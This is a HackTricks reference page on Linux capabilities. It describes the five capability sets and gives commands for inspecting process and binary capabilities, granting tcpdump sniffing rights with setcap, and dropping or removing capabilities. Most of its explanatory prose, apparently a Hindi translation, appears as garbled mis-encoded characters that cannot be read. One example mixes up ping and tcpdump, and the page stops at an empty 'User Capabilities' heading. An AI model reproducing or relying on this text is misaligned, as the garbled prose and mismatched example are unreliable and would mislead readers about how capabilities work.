# Linux Capabilities

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) **рд╕реНрдкреЗрди** рдореЗрдВ рд╕рдмрд╕реЗ рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╕рд╛рдЗрдмрд░рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ **рдпреВрд░реЛрдк** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреЗ рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рд╣рд░ рдЕрдиреБрд╢рд╛рд╕рди рдореЗрдВ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░рд╕реБрд░рдХреНрд╖рд╛ рдкреЗрд╢реЗрд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд╛рд▓рддрд╛ рд╣реБрдЖ рдмреИрдардХ рдмрд┐рдВрджреБ рд╣реИред\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Linux capabilities **рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЫреЛрдЯреЗ, рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЗрдХрд╛рдЗрдпреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд** рдХрд░рддреА рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдПрдХ рдЙрдкрд╕рдореБрдЪреНрдЪрдп рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИред рдпрд╣ рдкреВрд░реНрдг рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЕрдирд╛рд╡рд╢реНрдпрдХ рд░реВрдк рд╕реЗ рдкреНрд░рджрд╛рди рди рдХрд░рдХреЗ рдЬреЛрдЦрд┐рдореЛрдВ рдХреЛ рдХрдо рдХрд░рддрд╛ рд╣реИред

### рд╕рдорд╕реНрдпрд╛:
- рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдкрд╛рд╕ рд╕реАрдорд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ, рдЬреЛ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЙрдХреЗрдЯ рдЦреЛрд▓рдиреЗ рдЬреИрд╕реЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддреА рд╣реИрдВ, рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рд░реВрдЯ рдПрдХреНрд╕реЗрд╕ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

### рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ:

1. **Inherited (CapInh)**:
- **рдЙрджреНрджреЗрд╢реНрдп**: рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕реА рдХреНрд╖рдорддрд╛рдПрдБ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдиреАрдЪреЗ рдЖрддреА рд╣реИрдВред
- **рдХрд╛рд░реНрдпрд╛рддреНрдордХрддрд╛**: рдЬрдм рдПрдХ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ, рддреЛ рдпрд╣ рдЗрд╕ рд╕реЗрдЯ рдореЗрдВ рдЕрдкрдиреЗ рдорд╛рддрд╛-рдкрд┐рддрд╛ рд╕реЗ рдХреНрд╖рдорддрд╛рдПрдБ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реЗрддреА рд╣реИред рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реНрдкреЙрдиреНрд╕ рдХреЗ рдмреАрдЪ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреАред
- **рдкреНрд░рддрд┐рдмрдВрдз**: рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЙрди рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреА рдЬреЛ рдЙрд╕рдХреЗ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдХреЗ рдкрд╛рд╕ рдирд╣реАрдВ рдереАрдВред

2. **Effective (CapEff)**:
- **рдЙрджреНрджреЗрд╢реНрдп**: рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдХрд┐рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдХрд┐рд╕реА рднреА рдХреНрд╖рдг рдореЗрдВ рдХреМрди рд╕реА рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдХреНрд╖рдорддрд╛рдПрдБ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИрдВред
- **рдХрд╛рд░реНрдпрд╛рддреНрдордХрддрд╛**: рдпрд╣ рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рд╕реЗрдЯ рд╣реИ рдЬрд┐рд╕реЗ рд╡рд┐рднрд┐рдиреНрди рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░реНрдиреЗрд▓ рджреНрд╡рд╛рд░рд╛ рдЬрд╛рдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИред рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП, рдпрд╣ рд╕реЗрдЯ рдПрдХ рдзреНрд╡рдЬ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдпрд╣ рд╕рдВрдХреЗрдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдлрд╝рд╛рдЗрд▓ рдХреА рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рднрд╛рд╡реА рдорд╛рдиреА рдЬрд╛рдПрдБрдЧреАред
- **рдорд╣рддреНрд╡**: рдкреНрд░рднрд╛рд╡реА рд╕реЗрдЯ рддрд╛рддреНрдХрд╛рд▓рд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ, рдЬреЛ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕рдХреНрд░рд┐рдп рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд╕реЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИред

3. **Permitted (CapPrm)**:
- **рдЙрджреНрджреЗрд╢реНрдп**: рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрд╛рд╕ рдЕрдзрд┐рдХрддрдо рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рд╕реЗрдЯ рдХреНрдпрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред
- **рдХрд╛рд░реНрдпрд╛рддреНрдордХрддрд╛**: рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЕрдиреБрдордд рд╕реЗрдЯ рд╕реЗ рдПрдХ рдХреНрд╖рдорддрд╛ рдХреЛ рдкреНрд░рднрд╛рд╡реА рд╕реЗрдЯ рдореЗрдВ рдмрдврд╝рд╛ рд╕рдХрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрд╕реЗ рдЙрд╕ рдХреНрд╖рдорддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИред рдпрд╣ рдЕрдкрдиреА рдЕрдиреБрдордд рд╕реЗрдЯ рд╕реЗ рдХреНрд╖рдорддрд╛рдПрдБ рднреА рд╣рдЯрд╛ рд╕рдХрддреА рд╣реИред
- **рд╕реАрдорд╛**: рдпрд╣ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрд╛рд╕ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдКрдкрд░реА рд╕реАрдорд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЕрдкрдиреЗ рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджрд╛рдпрд░реЗ рд╕реЗ рдЕрдзрд┐рдХ рди рдЬрд╛рдПред

4. **Bounding (CapBnd)**:
- **рдЙрджреНрджреЗрд╢реНрдп**: рдпрд╣ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЬреАрд╡рдирдХрд╛рд▓ рдХреЗ рджреМрд░рд╛рди рдХрднреА рднреА рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рдХреНрд╖рдорддрд╛рдУрдВ рдкрд░ рдПрдХ рдЫрдд рд▓рдЧрд╛рддрд╛ рд╣реИред
- **рдХрд╛рд░реНрдпрд╛рддреНрдордХрддрд╛**: рднрд▓реЗ рд╣реА рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкрд╛рд╕ рдЕрдкрдиреА рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реА рдЧрдИ рдпрд╛ рдЕрдиреБрдордд рд╕реЗрдЯ рдореЗрдВ рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рдХреНрд╖рдорддрд╛ рд╣реЛ, рд╡рд╣ рдЙрд╕ рдХреНрд╖рдорддрд╛ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд░ рд╕рдХрддреА рдЬрдм рддрдХ рдХрд┐ рдпрд╣ рднреА рдмрд╛рдЙрдВрдбрд┐рдВрдЧ рд╕реЗрдЯ рдореЗрдВ рди рд╣реЛред
- **рдЙрдкрдпреЛрдЧ рдХрд╛ рдорд╛рдорд▓рд╛**: рдпрд╣ рд╕реЗрдЯ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХреА рд╕рдВрднрд╛рд╡рдирд╛рдУрдВ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реИ, рд╕реБрд░рдХреНрд╖рд╛ рдХреА рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдкрд░рдд рдЬреЛрдбрд╝рддрд╛ рд╣реИред

5. **Ambient (CapAmb)**:
- **рдЙрджреНрджреЗрд╢реНрдп**: рдпрд╣ рдХреБрдЫ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ `execve` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреЗ рджреМрд░рд╛рди рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рдкреВрд░реНрдг рд░реАрд╕реЗрдЯ рдХрд░реЗрдЧрд╛ред
- **рдХрд╛рд░реНрдпрд╛рддреНрдордХрддрд╛**: рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЧреИрд░-SUID рдХрд╛рд░реНрдпрдХреНрд░рдо рдЬреЛ рд╕рдВрдмрдВрдзрд┐рдд рдлрд╝рд╛рдЗрд▓ рдХреНрд╖рдорддрд╛рдПрдБ рдирд╣реАрдВ рд░рдЦрддреЗ рд╣реИрдВ, рдХреБрдЫ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдмрдирд╛рдП рд░рдЦ рд╕рдХрддреЗ рд╣реИрдВред
- **рдкреНрд░рддрд┐рдмрдВрдз**: рдЗрд╕ рд╕реЗрдЯ рдореЗрдВ рдХреНрд╖рдорддрд╛рдПрдБ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реА рдЧрдИ рдФрд░ рдЕрдиреБрдордд рд╕реЗрдЯ рдХреА рд╕реАрдорд╛рдУрдВ рдХреЗ рдЕрдзреАрди рд╣реЛрддреА рд╣реИрдВ, рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рд╡реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдиреБрдордд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рд╕реЗ рдЕрдзрд┐рдХ рди рд╣реЛрдВред
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
For further information check:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Processes & Binaries Capabilities

### Processes Capabilities

рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП, /proc рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ **status** рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдЪреВрдВрдХрд┐ рдпрд╣ рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЖрдЗрдП рдЗрд╕реЗ рдХреЗрд╡рд▓ рд▓рд┐рдирдХреНрд╕ рдХреНрд╖рдорддрд╛рдУрдВ рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рдЬрд╛рдирдХрд╛рд░реА рддрдХ рд╕реАрдорд┐рдд рдХрд░реЗрдВред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╕рднреА рдЪрд▓ рд░рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдХреНрд╖рдорддрд╛ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рддрд┐ рдереНрд░реЗрдб рдмрдирд╛рдП рд░рдЦреА рдЬрд╛рддреА рд╣реИ, рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдмрд╛рдЗрдирд░реА рдХреЗ рд▓рд┐рдП рдпрд╣ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрддреА рд╣реИред

рдЖрдк /usr/include/linux/capability.h рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдк рд╡рд░реНрддрдорд╛рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдХреНрд╖рдорддрд╛рдПрдБ `cat /proc/self/status` рдореЗрдВ рдпрд╛ `capsh --print` рдХрд░рдХреЗ рдФрд░ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА `/proc/<pid>/status` рдореЗрдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
рдпрд╣ рдХрдорд╛рдВрдб рдЕрдзрд┐рдХрд╛рдВрд╢ рд╕рд┐рд╕реНрдЯрдо рдкрд░ 5 рдкрдВрдХреНрддрд┐рдпрд╛рдБ рд▓реМрдЯрд╛рдиреА рдЪрд╛рд╣рд┐рдПред

* CapInh = рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓реА рдХреНрд╖рдорддрд╛рдПрдБ
* CapPrm = рдЕрдиреБрдордд рдХреНрд╖рдорддрд╛рдПрдБ
* CapEff = рдкреНрд░рднрд╛рд╡реА рдХреНрд╖рдорддрд╛рдПрдБ
* CapBnd = рдмрд╛рдЙрдВрдбрд┐рдВрдЧ рд╕реЗрдЯ
* CapAmb = рдПрдВрдмрд┐рдпрдВрдЯ рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рд╕реЗрдЯ
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
рдпреЗ рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ рдирдВрдмрд░ рд╕рдордЭ рдореЗрдВ рдирд╣реАрдВ рдЖрддреЗред capsh рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо рдЗрдиреНрд╣реЗрдВ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдирд╛рдо рдореЗрдВ рдбрд┐рдХреЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
рдЪрд▓реЛ рдЕрдм `ping` рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА **capabilities** рдХреА рдЬрд╛рдВрдЪ рдХрд░рддреЗ рд╣реИрдВ:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдПрдХ рдФрд░ рдФрд░ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИред рдПрдХ рдЪрд▓ рд░рд╣реЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рдмрд╕ **getpcaps** рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЙрд╕рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА (PID) рдХреЗ рдмрд╛рджред рдЖрдк рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЖрдИрдбреА рдХреА рдПрдХ рд╕реВрдЪреА рднреА рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
getpcaps 1234
```
рдЖрдЗрдП рдпрд╣рд╛рдБ `tcpdump` рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ, рдмрд╛рдЗрдирд░реА рдХреЛ рдкрд░реНрдпрд╛рдкреНрдд рдХреНрд╖рдорддрд╛рдПрдБ (`cap_net_admin` рдФрд░ `cap_net_raw`) рджреЗрдиреЗ рдХреЗ рдмрд╛рдж рддрд╛рдХрд┐ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ (_tcpdump рдкреНрд░рдХреНрд░рд┐рдпрд╛ 9562 рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рджрд┐рдП рдЧрдП рдХреНрд╖рдорддрд╛рдПрдБ рдмрд╛рдЗрдирд░реА рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ 2 рддрд░реАрдХреЛрдВ рдХреЗ рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддреА рд╣реИрдВред\
_**getpcaps**_ рдЯреВрд▓ **capget()** рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рдереНрд░реЗрдб рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдХреНрд╡реЗрд░реА рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рдХреЛ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ PID рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

### рдмрд╛рдЗрдирд░реА рдХреНрд╖рдорддрд╛рдПрдБ

рдмрд╛рдЗрдирд░реА рдореЗрдВ рдХреНрд╖рдорддрд╛рдПрдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рджреМрд░рд╛рди рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `ping` рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде `cap_net_raw` рдХреНрд╖рдорддрд╛ рдкрд╛рдирд╛ рдмрд╣реБрдд рд╕рд╛рдорд╛рдиреНрдп рд╣реИ:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
рдЖрдк **рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдмрд╛рдЗрдирд░реАрдЬрд╝ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

рдпрджрд┐ рд╣рдо _ping_ рдХреЗ рд▓рд┐рдП CAP\_NET\_RAW рдХреНрд╖рдорддрд╛рдПрдБ рд╣рдЯрд╛ рджреЗрдВ, рддреЛ рдкрд┐рдВрдЧ рдЙрдкрдпреЛрдЧрд┐рддрд╛ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдПред
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Besides the output of _capsh_ itself, the _tcpdump_ command itself should also raise an error.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

рддреНрд░реБрдЯрд┐ рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рджрд┐рдЦрд╛рддреА рд╣реИ рдХрд┐ рдкрд┐рдВрдЧ рдХрдорд╛рдВрдб рдХреЛ ICMP рд╕реЙрдХреЗрдЯ рдЦреЛрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИред рдЕрдм рд╣рдо рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдЕрдкреЗрдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред

### Remove Capabilities

You can remove capabilities of a binary with
```bash
setcap -r </path/to/binary>
```
## User Capabilities

